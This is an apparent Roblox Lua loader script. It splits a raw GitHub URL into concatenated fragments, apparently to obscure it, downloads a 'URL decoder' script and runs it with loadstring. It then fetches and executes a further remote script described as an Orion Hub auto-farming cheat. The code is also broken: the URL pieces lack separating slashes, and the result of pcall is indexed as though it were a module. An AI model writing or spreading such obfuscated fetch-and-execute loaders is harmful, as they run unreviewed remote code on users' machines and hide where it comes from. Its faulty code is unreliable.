-- Breaking the URL into smaller parts without breaking the script
local part1 = "h" .. "ttps"
local part2 = "://" .. "r" .. "aw"
local part3 = "g" .. "ithub"
local part4 = ".com/" .. "M" .. "elharper"
local part5 = "G" .. "abeBoa2"
local part6 = "refs/" .. "he" .. "ads"
local part7 = "/main/"
local part8 = "url_decoder" .. ".lua"

-- Combine the parts to form the full URL
local fullUrl = part1 .. part2 .. part3 .. part4 .. part5 .. part6 .. part7 .. part8

-- Fetch the URL decoder script
local urlDecoderScript
local success, err = pcall(function()
    urlDecoderScript = game:HttpGet(fullUrl)
end)

if not success or not urlDecoderScript or urlDecoderScript == "" then
    warn("Failed to retrieve URL decoder script: " .. (err or "Unknown error"))
    return
end

-- Execute the URL decoder script
local urlDecoder, executionErr = pcall(loadstring(urlDecoderScript))

if not urlDecoder then
    warn("Error executing URL decoder script:", executionErr)
    return
end

-- Access the decoded URL and whitelist check function
local decodedUrl = urlDecoder.decodedUrl
local isWhitelisted = urlDecoder.isWhitelisted

if not decodedUrl or decodedUrl == "" then
    warn("Decoded URL is invalid or empty!")
    return
end

-- Check if the decoded URL is valid and not empty
local successLoad, loadErrorMessage = pcall(function()
    -- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
    loadstring(game:HttpGet(decodedUrl))()
end)

if not successLoad then
    warn("Error loading the script:", loadErrorMessage)
end
